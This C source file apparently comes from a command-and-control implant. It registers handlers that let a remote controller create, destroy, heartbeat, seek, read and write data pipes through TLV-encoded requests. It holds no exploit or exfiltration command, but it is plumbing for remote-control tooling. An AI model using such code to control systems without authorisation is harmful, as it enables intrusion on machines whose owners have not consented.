/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <tlv.h>
#include <c2.h>
#include <tlv_types.h>
#include <log.h>
#include <api.h>
#include <pipe.h>

#include <uthash/uthash.h>

static pipe_t *pipe_from_tlv(pipe_t *pipes, tlv_pkt_t *tlv_pkt)
{
    int id;
    pipe_t *pipe;

    tlv_pkt_get_int(tlv_pkt, TLV_TYPE_PIPE_ID, &id);
    HASH_FIND_INT(pipes, &id, pipe);

    return pipe;
}

static pipes_t *pipes_from_tlv(pipes_t *pipes, tlv_pkt_t *tlv_pkt)
{
    int type;
    pipes_t *pipe;

    tlv_pkt_get_int(tlv_pkt, TLV_TYPE_PIPE_TYPE, &type);
    HASH_FIND_INT(pipes, &type, pipe);

    return pipe;
}

static tlv_pkt_t *pipe_create(c2_t *c2)
{
    int id;
    pipe_t *pipe;
    pipes_t *pipes;

    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);

    if (pipes == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_ID, &id);
    pipe = calloc(1, sizeof(*pipe));

    if (pipe == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    pipe->id = id;
    HASH_ADD_INT(pipes->pipes, id, pipe);

    if (pipes->callbacks.create_cb(pipe, c2) != 0)
    {
        log_debug("* Failed to create C2 pipe (id: %d)\n", id);
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    log_debug("* Created C2 pipe (id: %d)\n", id);
    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *pipe_destroy(c2_t *c2)
{
    pipes_t *pipes;
    pipe_t *pipe;

    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);

    if (pipes == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    pipe = pipe_from_tlv(pipes->pipes, c2->request);

    if (pipe == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    if (pipes->callbacks.destroy_cb(pipe, c2) != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    log_debug("* Destroyed C2 pipe (id: %d)\n", pipe->id);

    HASH_DEL(pipes->pipes, pipe);
    free(pipe);

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *pipe_heartbeat(c2_t *c2)
{
    tlv_pkt_t *result;
    pipes_t *pipes;
    pipe_t *pipe;

    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);

    if (pipes == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    pipe = pipe_from_tlv(pipes->pipes, c2->request);

    if (pipe == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    log_debug("* Checking C2 pipe (id: %d)\n", pipe->id);

    if (pipes->callbacks.heartbeat_cb(pipe) >= 0)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS);
        return result;
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *pipe_tell(c2_t *c2)
{
    int offset;

    tlv_pkt_t *result;
    pipes_t *pipes;
    pipe_t *pipe;

    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);

    if (pipes == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    pipe = pipe_from_tlv(pipes->pipes, c2->request);

    if (pipe == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    log_debug("* Telling from C2 pipe (id: %d)\n", pipe->id);
    offset = pipes->callbacks.tell_cb(pipe);

    if (offset >= 0)
    {
        result = api_craft_tlv_pkt(API_CALL_SUCCESS);
        tlv_pkt_add_int(result, TLV_TYPE_PIPE_OFFSET, offset);
        return result;
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *pipe_seek(c2_t *c2)
{
    int offset;
    int whence;

    pipes_t *pipes;
    pipe_t *pipe;

    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);

    if (pipes == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    pipe = pipe_from_tlv(pipes->pipes, c2->request);

    if (pipe == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_OFFSET, &offset);
    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_WHENCE, &whence);

    log_debug("* Seeking from C2 pipe (id: %d)\n", pipe->id);

    if (pipes->callbacks.seek_cb(pipe, offset, whence) != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

static tlv_pkt_t *pipe_write(c2_t *c2)
{
    int length;
    unsigned char *buffer;

    ssize_t bytes;
    pipes_t *pipes;
    pipe_t *pipe;

    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);

    if (pipes == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    pipe = pipe_from_tlv(pipes->pipes, c2->request);

    if (pipe == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_LENGTH, &length);
    tlv_pkt_get_bytes(c2->request, TLV_TYPE_PIPE_BUFFER, &buffer);

    if (buffer == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    log_debug("* Writing to C2 pipe (id: %d)\n", pipe->id);
    bytes = pipes->callbacks.write_cb(pipe, buffer, length);
    free(buffer);

    if (bytes >= 0)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS);
    }

    return api_craft_tlv_pkt(API_CALL_FAIL);
}

static tlv_pkt_t *pipe_read(c2_t *c2)
{
    int length;
    unsigned char *buffer;

    ssize_t bytes;
    tlv_pkt_t *result;
    pipes_t *pipes;
    pipe_t *pipe;

    pipes = pipes_from_tlv(c2->dynamic.pipes, c2->request);

    if (pipes == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    pipe = pipe_from_tlv(pipes->pipes, c2->request);

    if (pipe == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    tlv_pkt_get_int(c2->request, TLV_TYPE_PIPE_LENGTH, &length);
    buffer = calloc(1, length);

    if (buffer == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    log_debug("* Reading from C2 pipe (id: %d)\n", pipe->id);
    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
    bytes = pipes->callbacks.read_cb(pipe, buffer, length);

    if (bytes >= 0)
    {
        tlv_pkt_add_bytes(result, TLV_TYPE_PIPE_BUFFER, buffer, bytes);
    }
    else
    {
        free(buffer);
        return api_craft_tlv_pkt(API_CALL_FAIL);
    }

    free(buffer);
    return result;
}

void register_pipe_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, PIPE_READ, pipe_read);
    api_call_register(api_calls, PIPE_WRITE, pipe_write);
    api_call_register(api_calls, PIPE_SEEK, pipe_seek);
    api_call_register(api_calls, PIPE_TELL, pipe_tell);
    api_call_register(api_calls, PIPE_HEARTBEAT, pipe_heartbeat);
    api_call_register(api_calls, PIPE_CREATE, pipe_create);
    api_call_register(api_calls, PIPE_DESTROY, pipe_destroy);
}